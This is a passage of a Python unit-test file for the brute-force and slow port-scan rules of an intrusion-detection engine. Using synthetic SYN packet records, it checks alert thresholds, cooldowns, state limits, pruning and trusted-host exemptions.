        rule = BruteForceRule(threshold=5, window=60)
        base = time.time()
        alerts = []
        for port in (22, 3389):
            for i in range(5):
                a = rule.check(self._syn("10.0.1.1", "10.0.1.2", dst_port=port,
                                         timestamp=base + i * 0.1))
                if a:
                    alerts.append(a)
            base += 200
        self.assertEqual(len(alerts), 2)
        ports = {a["evidence"]["auth_port"] for a in alerts}
        self.assertIn(22, ports)
        self.assertIn(3389, ports)

    def test_non_syn_packets_not_counted(self):
        rule = BruteForceRule(threshold=3, window=60)
        base = time.time()
        for i in range(10):
            r = _ip_record(src="10.0.3.1", dst="10.0.3.2", dst_port=22,
                           initial_syn=False, tcp_flags=0x10,
                           timestamp=base + i * 0.1)
            self.assertIsNone(rule.check(r))

    def test_state_cardinality_bounded(self):
        rule = BruteForceRule(threshold=100, window=60, max_states=10)
        base = time.time()
        for i in range(50):
            rule.check(self._syn(f"10.0.{i}.1", "10.0.0.2", dst_port=22,
                                  timestamp=base + i * 0.01))
        with rule._lock:
            self.assertLessEqual(len(rule._history), 10)

    def test_prune_stale_removes_old_state(self):
        rule = BruteForceRule(threshold=100, window=5)
        base = time.time()
        for i in range(50):
            rule.check(self._syn("10.5.5.5", "10.5.5.6", dst_port=22,
                                  timestamp=base + i * 0.01))
        rule.prune_stale(base + 1000)
        with rule._lock:
            self.assertEqual(len(rule._history), 0)
            self.assertEqual(len(rule._cooldown), 0)

    def test_all_defined_auth_ports_trigger(self):
        rule = BruteForceRule(threshold=3, window=60)
        base = time.time()
        for port in sorted(_BRUTE_FORCE_AUTH_PORTS):
            alert = None
            for i in range(3):
                r = self._syn("10.10.0.1", "10.10.0.2", dst_port=port,
                              timestamp=base + i * 0.1)
                a = rule.check(r)
                if a:
                    alert = a
                    break
            self.assertIsNotNone(alert, f"Auth port {port} should trigger BRUTE_FORCE")
            base += 200  # advance past cooldown


# =============================================================================
# 6. SlowPortScanRule
# =============================================================================

class TestSlowPortScanRule(unittest.TestCase):

    def _syn(self, src, dst, dst_port, timestamp):
        return _ip_record(src=src, dst=dst, dst_port=dst_port,
                          initial_syn=True, tcp_flags=0x02, timestamp=timestamp)

    def test_invalid_settings_use_defaults_and_do_not_lower_scan_threshold(self):
        rule = SlowPortScanRule(
            threshold=0, window=0, max_states="invalid", cooldown=float("nan"))
        self.assertEqual(rule.threshold, 30)
        self.assertEqual(rule.window, 120)
        self.assertEqual(rule.max_states, 5000)
        self.assertEqual(rule.cooldown, 120.0)
        self.assertIsNone(rule.check(self._syn(
            "198.51.100.90", "203.0.113.90", 22, 100)))

    def test_slow_vertical_fires(self):
        rule = SlowPortScanRule(threshold=10, window=120)
        base = time.time()
        alert = None
        for i in range(10):
            r = self._syn("10.0.0.1", "10.0.0.2", dst_port=1000 + i,
                          timestamp=base + i * 5)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_name"], "SLOW_PORT_SCAN")
        self.assertEqual(alert["evidence"]["scan_type"], "slow_vertical")
        self.assertEqual(alert["severity"], "medium")

    def test_service_source_port_does_not_hide_initial_syn_slow_scan(self):
        rule = SlowPortScanRule(threshold=3, window=120)
        alert = None
        for i, port in enumerate((22, 23, 25)):
            record = self._syn(
                "203.0.113.44", "203.0.113.80", port, 100 + i * 20)
            record["src_port"] = 80
            alert = rule.check(record) or alert
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.11")
        self.assertEqual(alert["evidence"]["distinct_ports"], 3)

        reply = self._syn(
            "203.0.113.80", "203.0.113.44", 50000, 200)
        reply.update(src_port=80, initial_syn=False, tcp_flags=0x12,
                     syn_flag=True)
        self.assertIsNone(rule.check(reply))

    def test_syn_ack_is_not_counted_when_initial_syn_metadata_is_missing(self):
        rule = SlowPortScanRule(threshold=2, window=120)
        for i, port in enumerate((22, 23, 25)):
            record = self._syn(
                "203.0.113.80", "203.0.113.44", port, 100 + i)
            record.pop("initial_syn")
            record.update(syn_flag=True, tcp_flags=0x12)
            self.assertIsNone(rule.check(record))
        self.assertEqual(rule._vert, {})
        self.assertEqual(rule._horiz, {})

    def test_slow_horizontal_fires(self):
        rule = SlowPortScanRule(threshold=10, window=120)
        base = time.time()
        alert = None
        for i in range(10):
            r = self._syn("10.0.1.1", f"10.0.1.{i+2}", dst_port=22,
                          timestamp=base + i * 5)
            alert = rule.check(r)
            if alert:
                break
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["scan_type"], "slow_horizontal")

    def test_source_wide_cooldown_suppresses_new_vertical_target_bursts(self):
        rule = SlowPortScanRule(threshold=3, window=120, cooldown=30)
        base = time.time()
        for i in range(3):
            first = rule.check(self._syn("10.0.0.8", "10.0.0.2", 1000 + i, base + i))
        self.assertIsNotNone(first)
        for i in range(3):
            later = rule.check(self._syn("10.0.0.8", "10.0.0.3", 2000 + i, base + 5 + i))
        self.assertIsNone(later)
        for i in range(3):
            after = rule.check(self._syn("10.0.0.8", "10.0.0.4", 3000 + i, base + 40 + i))
        self.assertIsNotNone(after)

    def test_horizontal_scan_alerts_when_vertical_is_in_cooldown(self):
        rule = SlowPortScanRule(threshold=3, window=120, cooldown=30)
        base = time.time()
        # Trigger vertical scan for 10.0.0.9
        for i in range(3):
            alert = rule.check(self._syn("10.0.0.9", "10.0.0.2", 1000 + i, base + i))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["scan_type"], "slow_vertical")

        # Now send horizontal scan probes to port 80 across 3 hosts while vertical is in cooldown
        horiz_alert = None
        for i in range(3):
            a = rule.check(self._syn("10.0.0.9", f"10.0.0.{10+i}", 80, base + 5 + i))
            if a:
                horiz_alert = a
        self.assertIsNotNone(horiz_alert)
        self.assertEqual(horiz_alert["evidence"]["scan_type"], "slow_horizontal")

    def test_below_threshold_no_alert(self):
        rule = SlowPortScanRule(threshold=10, window=120)
        base = time.time()
        for i in range(9):
            r = self._syn("10.0.2.1", "10.0.2.2", dst_port=2000 + i,
                          timestamp=base + i * 5)
            self.assertIsNone(rule.check(r))

    def test_window_expiry_resets_count(self):
        rule = SlowPortScanRule(threshold=5, window=60)
        base = time.time()
        for i in range(4):
            rule.check(self._syn("10.0.3.1", "10.0.3.2", dst_port=3000 + i,
                                  timestamp=base + i * 10))
        for i in range(4):
            r = self._syn("10.0.3.1", "10.0.3.2", dst_port=4000 + i,
                          timestamp=base + 1000 + i * 10)
            self.assertIsNone(rule.check(r))

    def test_duplicate_ports_not_double_counted(self):
        rule = SlowPortScanRule(threshold=5, window=120)
        base = time.time()
        for i in range(10):
            r = self._syn("10.0.4.1", "10.0.4.2", dst_port=80 + (i % 2),
                          timestamp=base + i * 5)
            self.assertIsNone(rule.check(r))

    def test_state_cardinality_bounded(self):
        rule = SlowPortScanRule(threshold=100, window=120, max_states=5)
        base = time.time()
        for i in range(20):
            rule.check(self._syn(f"10.1.{i}.1", "10.1.0.2", dst_port=1000 + i,
                                  timestamp=base + i * 0.1))
        with rule._lock:
            self.assertLessEqual(len(rule._vert), 5)

    def test_active_source_cooldown_survives_key_churn(self):
        rule = SlowPortScanRule(threshold=3, window=120, max_states=1, cooldown=30)
        self.assertTrue(rule._allow_alert(("10.8.0.1", "vertical"), 100))
        self.assertTrue(rule._allow_alert(("10.8.0.2", "vertical"), 100))
        self.assertFalse(rule._allow_alert(("10.8.0.1", "vertical"), 101))
        self.assertTrue(rule._allow_alert(("10.8.0.3", "vertical"), 102))
        self.assertIn(("10.8.0.1", "vertical"), rule._alert_cooldown)
        self.assertNotIn(("10.8.0.2", "vertical"), rule._alert_cooldown)
        self.assertLessEqual(len(rule._alert_cooldown), rule.max_states * 2)

    def test_prune_stale_removes_state(self):
        rule = SlowPortScanRule(threshold=100, window=30)
        base = time.time()
        for i in range(10):
            rule.check(self._syn("10.5.5.5", "10.5.5.6", dst_port=6000 + i,
                                  timestamp=base + i))
        rule.prune_stale(base + 10000)
        with rule._lock:
            self.assertEqual(len(rule._vert), 0)
            self.assertEqual(len(rule._horiz), 0)

    def test_trusted_host_exempt(self):
        import engine.rules as rm
        original = rm.TRUSTED_HOSTS.copy()
        try:
            rm.TRUSTED_HOSTS.add("10.99.99.1")
            rule = SlowPortScanRule(threshold=3, window=120)
            base = time.time()
            for i in range(10):
                r = self._syn("10.99.99.1", "10.0.0.2", dst_port=5000 + i,
                              timestamp=base + i * 5)
                self.assertIsNone(rule.check(r))
        finally:
            rm.TRUSTED_HOSTS.clear()
            rm.TRUSTED_HOSTS.update(original)

    def test_brute_force_prune_stale_clears_orphaned_saturated_keys(self):
        rule = BruteForceRule(threshold=3, window=60)
        key_active = ("10.0.0.1", "10.0.0.2", 22)
        key_expired = ("10.0.0.3", "10.0.0.4", 22)
        rule._history[key_active] = [90.0, 95.0, 100.0]
        rule._history[key_expired] = [10.0, 11.0, 12.0]  # will expire at now=100 (cutoff=40)
        rule._saturated_history.add(key_active)
        rule._saturated_history.add(key_expired)

        rule.prune_stale(now=100.0)

        self.assertIn(key_active, rule._history)
        self.assertNotIn(key_expired, rule._history)
        self.assertIn(key_active, rule._saturated_history)
        self.assertNotIn(key_expired, rule._saturated_history)

    def test_slow_port_scan_ordered_dict_lru_eviction(self):
        rule = SlowPortScanRule(threshold=5, window=120, max_states=2)
        # Populate 2 vertical keys
        rule.check(self._syn("10.0.0.1", "10.0.0.10", dst_port=1001, timestamp=100.0))
        rule.check(self._syn("10.0.0.2", "10.0.0.10", dst_port=1002, timestamp=101.0))
        # Refresh first key so second key becomes oldest
        rule.check(self._syn("10.0.0.1", "10.0.0.10", dst_port=1003, timestamp=102.0))
        # Insert third key - should evict second key ("10.0.0.2", "10.0.0.10")
        rule.check(self._syn("10.0.0.3", "10.0.0.10", dst_port=1004, timestamp=103.0))

        with rule._lock:
            self.assertIn(("10.0.0.1", "10.0.0.10"), rule._vert)
            self.assertNotIn(("10.0.0.2", "10.0.0.10"), rule._vert)
            self.assertIn(("10.0.0.3", "10.0.0.10"), rule._vert)


if __name__ == "__main__":
    unittest.main()
